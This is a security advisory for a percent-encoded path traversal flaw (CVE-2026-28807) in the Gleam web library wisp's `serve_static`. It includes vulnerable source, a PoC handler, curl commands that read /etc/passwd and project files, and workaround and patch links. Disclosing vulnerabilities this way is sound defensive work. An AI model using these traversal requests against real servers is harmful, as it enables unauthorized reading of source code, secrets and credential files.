# [H] Wisp Vulnerable to Path Traversal

## Summary
Severity: High
Advisory: GHSA-h7cj-j2vv-qw8r
CVE: CVE-2026-28807
CWE: CWE-22
Ecosystem: Hex
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-03-11
Source: https://github.com/advisories/GHSA-h7cj-j2vv-qw8r
Type: github-advisory

## Affected
- Hex: `wisp` — affected >=2.1.1 <2.2.1

## Details
### Summary

`wisp.serve_static` is vulnerable to arbitrary file read via percent-encoded path traversal (`%2e%2e`). The directory traversal sanitization runs before percent-decoding, allowing encoded `..` sequences to bypass the filter. An unauthenticated attacker can read any file readable by the application process in a single HTTP request.

### Details

In `src/wisp.gleam`, `serve_static` processes the request path in this order:

```gleam
let path =
  path
  |> string.drop_start(string.length(prefix))
  |> string.replace(each: "..", with: "")   // Step 1: sanitize
  |> filepath.join(directory, _)

let path = case uri.percent_decode(path) {  // Step 2: decode
  Ok(p) -> p
  Error(_) -> path
}
```

Sanitization (step 1) strips literal `..` but runs **before** percent-decoding (step 2). The encoded sequence `%2e%2e` passes through `string.replace` unchanged, then `uri.percent_decode` converts it to `..`, which the OS resolves as directory traversal when the file is read.

### PoC

Any application using `wisp.serve_static`:

```gleam
fn handle_request(req: wisp.Request) -> wisp.Response {
  use <- wisp.serve_static(req, under: "/static", from: priv_directory())
  wisp.not_found()
}
```

Exploit (requires `--path-as-is` to prevent client-side normalization):

```bash
# Read /etc/passwd
curl -s --path-as-is \
  "http://localhost:8080/static/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# Read project source code
curl -s --path-as-is \
  "http://localhost:8080/static/%2e%2e/%2e%2e/src/app.gleam"

# Read project config
curl -s --path-as-is \
  "http://localhost:8080/static/%2e%2e/%2e%2e/gleam.toml"
```

### Impact

This is a **path traversal / arbitrary file read** vulnerability (CWE-22). Any application using `wisp.serve_static` is affected. An unauthenticated attacker can read:

- Application source code
- Configuration and secrets in `priv/`
- `.env` files, `secret_key_base`, private keys
- System files (`/etc/passwd`, `/etc/shadow` if permissions allow)

### Workaround

Copy the [fixed implementation](https://github.com/gleam-wisp/wisp/blob/161118c431047f7ef1ff7cabfcc38981877fdd93/src/wisp.gleam#L1413-L1461) to your codebase and replace references to wisp.serve_static with this version in your codebase.

### References

* Commit that introduced the vulnerability: https://github.com/gleam-wisp/wisp/commit/129dcb1fe10ab1e676145d91477535e1c90ab550
* Patch Commit: https://github.com/gleam-wisp/wisp/commit/161118c431047f7ef1ff7cabfcc38981877fdd93

## References
- https://github.com/gleam-wisp/wisp/security/advisories/GHSA-h7cj-j2vv-qw8r
- https://nvd.nist.gov/vuln/detail/CVE-2026-28807
- https://github.com/gleam-wisp/wisp/commit/129dcb1fe10ab1e676145d91477535e1c90ab550
- https://github.com/gleam-wisp/wisp/commit/161118c431047f7ef1ff7cabfcc38981877fdd93
- https://cna.erlef.org/cves/CVE-2026-28807.html
- https://github.com/gleam-wisp/wisp
- https://osv.dev/vulnerability/EEF-CVE-2026-28807
